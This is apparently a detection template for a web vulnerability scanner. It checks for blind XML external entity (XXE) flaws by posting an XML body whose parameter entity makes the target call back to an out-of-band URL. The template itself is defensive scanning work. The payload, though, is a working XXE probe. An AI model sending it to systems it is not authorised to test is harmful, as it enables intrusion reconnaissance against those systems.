id: xxe-blind-oob
name: XXE Blind OOB
description: Detects blind XXE via out-of-band callback correlation.
author: GASH contributors
severity: critical
tags: [xxe, blind, oob, xml]
safe: false
deep: false
active: true
requires_auth: false
oob: required
max_requests: 30
phase: probe
order: 81
api_version: "1.0"
tests: tests/fixtures/xxe-blind-oob/
request:
  method: POST
  body: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{{OOB_URL}}"> %xxe;]><r/>'
oracle:
  name: oob
  params:
    namespace: xxe
